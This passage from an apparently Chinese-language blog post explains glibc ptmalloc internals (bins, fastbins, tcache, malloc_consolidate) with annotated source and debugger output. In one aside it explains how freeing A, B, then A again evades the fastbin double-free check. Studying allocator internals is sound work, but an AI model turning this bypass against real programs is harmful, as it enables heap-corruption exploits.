bin-&gt;fd = bin-&gt;bk = bin; <span class="comment">// 最初时,各个bins链表头都指向自身</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> MORECORE_CONTIGUOUS</span></span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)		</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        set_noncontiguous(av);		<span class="comment">//看不懂</span></span><br><span class="line">    <span class="keyword">if</span> (av == &amp;main_arena)		<span class="comment">//主分配区的fastbins最大存放0x80的堆块(包含元数据)</span></span><br><span class="line">        set_max_fast(DEFAULT_MXFAST); <span class="comment">// 0x80</span></span><br><span class="line">    atomic_store_relaxed(&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    av-&gt;top = initial_top(av);			<span class="comment">//初始化分配区头块,指向unsortedbin桶子头</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里对<code>topchunk</code>的初始化效果是,<code>topchunk</code>指向<code>unsortedbin</code>桶子头</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">top = 0x7ffff7fa6ce0 &lt;main_arena+96&gt;,</span><br><span class="line">bins = &#123;0x7ffff7fa6ce0 &lt;main_arena+96&gt;, 0x7ffff7fa6ce0 &lt;main_arena+96&gt;,...</span><br></pre></td></tr></table></figure>
<h3 id="malloc_par">malloc_par</h3>
<p>分配区配置文件,只有一个实例<code>mp_</code>,位于<code>glibc</code>内部,在<code>glibc</code>加载时即完成初始化</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span> <span class="title">mp_</span> =</span></span><br><span class="line">    &#123;</span><br><span class="line">        .top_pad = DEFAULT_TOP_PAD,</span><br><span class="line">        .n_mmaps_max = DEFAULT_MMAP_MAX,</span><br><span class="line">        .mmap_threshold = DEFAULT_MMAP_THRESHOLD,</span><br><span class="line">        .trim_threshold = DEFAULT_TRIM_THRESHOLD,</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof(long) == 4 ? 2 : 8))</span></span><br><span class="line">        .arena_test = NARENAS_FROM_NCORES(<span class="number">1</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">            ,</span><br><span class="line">        .tcache_count = TCACHE_FILL_COUNT,</span><br><span class="line">        .tcache_bins = TCACHE_MAX_BINS,</span><br><span class="line">        .tcache_max_bytes = tidx2usize(TCACHE_MAX_BINS - <span class="number">1</span>),</span><br><span class="line">        .tcache_unsorted_limit = <span class="number">0</span> <span class="comment">/* No limit.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x mp_</span><br><span class="line"><span class="variable">$15</span> = &#123;</span><br><span class="line">  trim_threshold = 0x20000,</span><br><span class="line">  top_pad = 0x20000,</span><br><span class="line">  mmap_threshold = 0x20000,</span><br><span class="line">  arena_test = 0x8,</span><br><span class="line">  arena_max = 0x0,</span><br><span class="line">  thp_pagesize = 0x0,</span><br><span class="line">  hp_pagesize = 0x0,</span><br><span class="line">  hp_flags = 0x0,</span><br><span class="line">  n_mmaps = 0x0,</span><br><span class="line">  n_mmaps_max = 0x10000,</span><br><span class="line">  max_n_mmaps = 0x0,</span><br><span class="line">  no_dyn_threshold = 0x0,</span><br><span class="line">  mmapped_mem = 0x0,</span><br><span class="line">  max_mmapped_mem = 0x0,</span><br><span class="line">  sbrk_base = 0x0,</span><br><span class="line">  tcache_bins = 0x40,				//tcache有0x40个桶子</span><br><span class="line">  tcache_max_bytes = 0x408,			//tcache中最大能放的堆块大小</span><br><span class="line">  tcache_count = 0x7,				//一个tcache桶子中最多放7块</span><br><span class="line">  tcache_unsorted_limit = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="斌s">斌s</h2>
<p><strong>unsortedbin,smallbins,largebins</strong>实际上位于同一个数组的不同下标位置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];				<span class="comment">//unsortedbin &amp; smallbins &amp; largebins</span></span><br><span class="line">								<span class="comment">//NBINS = 128</span></span><br><span class="line">								<span class="comment">//bins[254]</span></span><br></pre></td></tr></table></figure>
<p><code>bins</code>共有<code>254</code>个元素,但是实际上是<code>127</code>个桶子头,每个桶子头占用相邻的两个<code>bins</code>元素</p>
<p>这个桶子头挺奇葩的,名义上桶子头是一个<code>malloc_chunk</code>,然而实际上一个桶子头只有<code>fd</code>和<code>bk</code>两个指针有效,其他部分和前一个桶子头重叠</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mbinptr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* addressing -- note that bin_at(0) does not exist */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))			      \</span></span><br><span class="line"><span class="meta">             - offsetof (struct malloc_chunk, fd))</span></span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026183930533.png"
alt="bin_at" />
<figcaption aria-hidden="true">bin_at</figcaption>
</figure>
<p>可以看到<code>bins[0]</code>既处于<code>bin_at(M,1)-&gt;fd</code>的位置,又处于<code>bin_at(M,2)-&gt;prev_size</code>的位置</p>
<p>而实际上桶子头并不需要<code>prev_size</code>和<code>size</code>这两个属性,只需要前驱后继指针就可以了</p>
<p><strong>因此<code>bins[0]</code>扮演<code>bin_at(M,1)-&gt;fd</code>的角色</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bin_at(M,0)								//无效</span><br><span class="line">bin_at(M,1) =&gt; unsorted bin				//1个</span><br><span class="line">bin_at(M,2~63) =&gt; small bins			//</span><br><span class="line">bin_at(M,64~126) =&gt; large bins</span><br></pre></td></tr></table></figure>
<p><strong>fastbins</strong>比较特殊,是上述三种<code>bins</code>的缓存器,自己使用一个数组</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mfastbinptr fastbinsY[NFASTBINS];</span><br></pre></td></tr></table></figure>
<h3 id="topchunk">Topchunk</h3>
<p><code>topchunk</code>是杂货市场</p>
<p>最初斌家一穷二白, 用户从<strong>头块杂货市场</strong>直接拿货,
用完了释放的时候, 斌家的乱斌来拾破烂儿, 然后拿回家和大斌小斌分赃</p>
<p>此后用户优先从斌家拿货,
斌家没货才会去<strong>头块杂货市场</strong>拿货</p>
<h4 id="algorithm">algorithm</h4>
<p>如果各个<code>bin</code>都没能满足分配请求,那么只能请<code>topchunk</code>出山</p>
<p>这是<code>ptmalloc</code>堆管理器能够拿出的最大内存块了</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241031150833167.png"
alt="image-20241031150833167" />
<figcaption aria-hidden="true">image-20241031150833167</figcaption>
</figure>
<h3 id="快斌fastbins">快斌Fastbins</h3>
<h4 id="datastructure">datastructure</h4>
<p><code>fastbins</code>实际上是一组单链表,
该单链表的所有附加头节点位于列表<code>fastbins</code>列表中</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026103730227.png"
alt="image-20241026103730227" />
<figcaption aria-hidden="true">image-20241026103730227</figcaption>
</figure>
<p><code>fastbins</code>中共有<code>10</code>个单链表</p>
<p>显然每个单链表中存放大小相同的堆块,具体来说,堆块大小到下标的映射为:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fastbin_index(sz) </span><br><span class="line">	= ((((<span class="type">unsigned</span> <span class="type">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br><span class="line">	= ( sz &gt;&gt; <span class="number">4</span> ) - <span class="number">2</span> </span><br><span class="line">        </span><br><span class="line"> </span><br><span class="line">#MAX_FAST_SIZE     </span><br><span class="line">	= (<span class="number">80</span> * SIZE_SZ / <span class="number">4</span>)</span><br><span class="line">    = <span class="number">160</span></span><br><span class="line"></span><br><span class="line">NFASTBINS  </span><br><span class="line">    = (fastbin_index (request2size (MAX_FAST_SIZE)) + <span class="number">1</span>)</span><br><span class="line">    = fastbin_index(<span class="number">0xb0</span>) + <span class="number">1</span></span><br><span class="line">    = <span class="number">0xb0</span> / <span class="number">0x10</span> - <span class="number">2</span> + <span class="number">1</span></span><br><span class="line">    = <span class="number">0xb</span> - <span class="number">2</span> + <span class="number">1</span></span><br><span class="line">    = <span class="number">0xa</span></span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>fastbins idx</th>
<th>mem_size</th>
<th>chunk_size</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>0x10</td>
<td>0x20</td>
</tr>
<tr>
<td>1</td>
<td>0x20</td>
<td>0x30</td>
</tr>
<tr>
<td>2</td>
<td>0x30</td>
<td>0x40</td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>6</td>
<td></td>
<td>0x80</td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>9</td>
<td>0xa0</td>
<td>0xb0</td>
</tr>
</tbody>
</table>
<blockquote>
<p>然而实际上只能用到前<code>7</code>个,也就是<code>[0:6]</code>这<code>7</code>个桶,这是分配区初始化时会限制最大<code>fastbins</code>堆块大小为<code>0x80</code>(包含元数据)</p>
<p>然后在<code>_int_free</code>函数中会检查当前堆块大小</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast ())&#123;</span><br><span class="line">    <span class="comment">//尝试使用fastbin</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果当前堆块大小大于<code>0x80</code>则不会通过该检查,也就不会往<code>fastbins</code>中塞</p>
<p>如果调用<code>set_max_fast(s)</code>重新设置<code>global_max_fast</code>值,使其大于<code>MAX_FAST_SIZE</code>,也是不可以的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> set_max_fast(s) \</span></span><br><span class="line"><span class="meta">  global_max_fast = (((size_t) (s) &lt;= MALLOC_ALIGN_MASK - SIZE_SZ)	\</span></span><br><span class="line"><span class="meta">                     ? MIN_CHUNK_SIZE / 2 : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="title function_">INTERNAL_SIZE_T</span></span><br><span class="line"> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Tell the GCC optimizers that global_max_fast is never larger</span></span><br><span class="line"><span class="comment">     than MAX_FAST_SIZE.  This avoids out-of-bounds array accesses in</span></span><br><span class="line"><span class="comment">     _int_malloc after constant propagation of the size parameter.</span></span><br><span class="line"><span class="comment">     (The code never executes because malloc preserves the</span></span><br><span class="line"><span class="comment">     global_max_fast invariant, but the optimizers may not recognize</span></span><br><span class="line"><span class="comment">     this.)  */</span></span><br><span class="line">  <span class="keyword">if</span> (global_max_fast &gt; MAX_FAST_SIZE)</span><br><span class="line">    __builtin_unreachable ();</span><br><span class="line">  <span class="keyword">return</span> global_max_fast;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接<code>__builtin_unreachable</code></p>
</blockquote>
<h4 id="algorithm-1">algorithm</h4>
<p>快斌可能去这几个地方进货:</p>
<p>1.<code>free</code>时<code>tcache</code>未启用或者已经充满,并且堆块不是<code>mmap</code>堆块,并且大小在快斌管理范围内,并且快斌缺货,
那么快斌会留下这块</p>
<h5 id="free">free</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241021102154730.png"
alt="free beyond tcache" />
<figcaption aria-hidden="true">free beyond tcache</figcaption>
</figure>
<p>当对应堆块大小的<code>tcache</code>被填充满之后,如果还有相同大小的堆块释放,会先尝试放到<code>fastbins</code>中</p>
<p>在<code>x64</code>上,默认情况下,小于<code>0x80</code>(包含元数据)的堆块,才会被塞到<code>fastbins</code>中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//_int_malloc.c</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);								<span class="comment">//size换算桶下标</span></span><br><span class="line">fb = &amp;fastbin(av, idx);												<span class="comment">//桶子头节点</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">mchunkptr old = *fb, old2;											<span class="comment">//*fb是桶子头原来指向的第一个chunk</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (SINGLE_THREAD_P)			<span class="comment">//如果当前进程只有一个线程,那么显然只会使用到main_arena,不会有其他分配区</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">       add (i.e., double free).  */</span>									<span class="comment">//唐氏一样的DF判断</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>))								<span class="comment">//当前释放的p是否和上次释放是同一块</span></span><br><span class="line">        malloc_printerr(<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">    p-&gt;fd = PROTECT_PTR(&amp;p-&gt;fd, old);								<span class="comment">//头插法上链,后继指针也使用SafeLinking</span></span><br><span class="line">    *fb = p;														<span class="comment">//桶子头到堆块的指针是裸的</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">           add (i.e., double free).  */</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">        old2 = old;</span><br><span class="line">        p-&gt;fd = PROTECT_PTR(&amp;p-&gt;fd, old);</span><br><span class="line">    &#125; <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里有一个非常唐氏的二次释放检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>))								</span><br><span class="line">    malloc_printerr(<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>意思就是本次释放的堆块和桶子里最后一次释放的堆块不能是一个</p>
<p>那先<code>free(A)</code>然后<code>free(B)</code>然后<code>free(A)</code>,就饶过了</p>
</blockquote>
<p><strong>注意到返还给fastbins的堆块,不会消除下一堆块P(Prev in
use)标志,这就导致堆块合并时不会牵扯到fastbins中的堆块</strong></p>
<h5 id="malloc">malloc</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026174304710.png"
alt="malloc beyond tcache" />
<figcaption aria-hidden="true">malloc beyond tcache</figcaption>
</figure>
<p>一次<code>malloc</code>请求,可能发生两件事:</p>
<p>1.如果<code>fastbin</code>对应桶子中有空闲堆块,把<code>fastbin</code>中相应桶子中的<strong>头块</strong>返回</p>
<p>2.如果<code>tcache</code>对应桶子有空,再把<code>fastbin</code>中剩下的相应大小的堆块塞满<code>tcache</code>对应的桶子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast()))</span><br><span class="line">&#123;</span><br><span class="line">    idx = fastbin_index(nb);                                            <span class="comment">//大小换算下标</span></span><br><span class="line">    mfastbinptr *fb = &amp;fastbin(av, idx);                                <span class="comment">//桶子头</span></span><br><span class="line">    mchunkptr pp;                                               </span><br><span class="line">    victim = *fb;                                                       <span class="comment">//桶里的第一块</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)                                                 <span class="comment">//如果桶里一块都没有,就别在fastbins中废话了,滚蛋就完了</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(misaligned_chunk(victim)))                 <span class="comment">//对齐检查</span></span><br><span class="line">            malloc_printerr(<span class="string">&quot;malloc(): unaligned fastbin chunk detected 2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (SINGLE_THREAD_P)                                            <span class="comment">//如果是单线程则将头块拆下来, 次块成为头块</span></span><br><span class="line">            *fb = REVEAL_PTR(victim-&gt;fd);</span><br><span class="line">        <span class="keyword">else</span>                                                            <span class="comment">//如果是多线程, 则调用REMOVE_FB宏将头块拆下来</span></span><br><span class="line">            REMOVE_FB(fb, pp, victim);</span><br><span class="line">        <span class="keyword">if</span> (__glibc_likely(victim != <span class="literal">NULL</span>))                             <span class="comment">//正常情况下应该就拿到了一块</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">size_t</span> victim_idx = fastbin_index(chunksize(victim));       <span class="comment">//再检查一下拿到的这块大小是否合格</span></span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect(victim_idx != idx, <span class="number">0</span>))					<span class="comment">//检校一下这个堆块是不是插班生</span></span><br><span class="line">                malloc_printerr(<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">            check_remalloced_chunk(av, victim, nb);</span><br><span class="line">           ...</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//////////////////////////////////////</span></span><br><span class="line">      <span class="comment">////////////尝试缓存至tcache////////////</span></span><br><span class="line">      <span class="comment">//////////////////////////////////////        </span></span><br><span class="line">               </span><br><span class="line">      <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">      alloc_perturb(p, bytes);											<span class="comment">//堆块在给用户使用之前,把其中的数据全都擦除,防止信息泄露</span></span><br><span class="line">      <span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure>
<p>实际上如果编译时开启了<code>USE_TCACHE</code>选项(默认是开启的),</p>
<p>在本次分配请求拿到堆块之后,在返回之前,还会先尝试把<code>fastbin</code>中的剩余的同样大小的堆块缓存到<code>tcache</code>中,直到<code>tcache</code>塞满或者<code>fastbin</code>空</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE                              <span class="comment">//如果使用tcache, 下面要把fastbin中的堆块尝试缓存进入tcache,为下一次分配加速</span></span></span><br><span class="line">            <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">           stash them in the tcache.  */</span></span><br><span class="line">            <span class="type">size_t</span> tc_idx = csize2tidx(nb);                             <span class="comment">//计算nb大小的堆块,在tcache中的下标</span></span><br><span class="line">            <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)                     <span class="comment">//判断是否在tcache范围中</span></span><br><span class="line">            &#123;</span><br><span class="line">                mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">                <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)<span class="comment">//检查tcache对应桶是否有空间</span></span><br><span class="line">                &#123;<span class="comment">//while终止的条件,要么是tcache被狠狠塞满了,要么是fastbin一滴也不剩了</span></span><br><span class="line">                    <span class="keyword">if</span> (__glibc_unlikely(misaligned_chunk(tc_victim)))</span><br><span class="line">                        malloc_printerr(<span class="string">&quot;malloc(): unaligned fastbin chunk detected 3&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">                        *fb = REVEAL_PTR(tc_victim-&gt;fd);									</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        REMOVE_FB(fb, pp, tc_victim);</span><br><span class="line">                        <span class="keyword">if</span> (__glibc_unlikely(tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    tcache_put(tc_victim, tc_idx);<span class="comment">//再塞一个</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<h5 id="malloc_consolidate">malloc_consolidate</h5>
<p>由于fastbins中的堆块不会被合并,处于一种不彻底释放的状态,可能导致外部碎片增加,比如假设某一时刻堆内存布局如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[64B @ smallbins][16B @ fastbins][64B @ smallbins]</span><br></pre></td></tr></table></figure>
<p>总计有<code>144B</code>的空闲内存空间</p>
<p>对于一个<code>128B</code>的请求,
却因为中间<code>fastbins</code>中的堆块不能被合并,而得不到满足</p>
<p>因此<code>malloc_consolidate</code>函数的职责,就是适时清理<code>fastbins</code>,尝试合并出大西瓜来,减少外部碎片</p>
<blockquote>
<p>外部碎片:</p>
<p>多次无规律的分配与释放之后堆内存中出现很多小空洞,</p>
<p>小空洞可能加起来有较大的空间,但是实际上不连续,不能满足一个真正的大空间申请</p>
<p>内部碎片:</p>
<p>因为元数据以及对齐因素,导致堆块实际大小大于所需大小所造成的内存浪费</p>
</blockquote>
<p><strong>malloc_consolidate发生时机</strong></p>
<p><code>malloc_consolidate</code>用于清扫<code>fastbins</code>中的黑户</p>
<p>可能发生的时机:</p>
<p>1.<code>malloc</code>请求不能在<code>tcache,fastbins,smallbins</code>中得到满足,并且此时<code>fastbins</code>中至少有一个堆块</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))		<span class="comment">//当fastbin中一旦有堆块,av-&gt;have_fastchunks就会被置位</span></span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>2.当使用<code>topchunk</code>进行分配<strong>仍无法满足</strong>时,考虑到<code>fastbins</code>中的堆块可能合并到<code>topchunk</code>,以扩大<code>topchunk</code>,可能满足分配需求,因此此时也会尝试</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    victim = av-&gt;top;</span><br><span class="line">    size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">      &#123;</span><br><span class="line">	...<span class="comment">//使用topchunk可以满足需求</span></span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">       here for all block sizes.  */</span></span><br><span class="line"><span class="comment">//topchunk无法直接满足需求,尝试将fastbins中的黑户合并到topchunk,在下一个循环时重新尝试使用topchunk分配</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">      &#123;</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">        <span class="comment">/* restore original bin index */</span></span><br><span class="line">        <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">          idx = smallbin_index (nb);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          idx = largebin_index (nb);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span 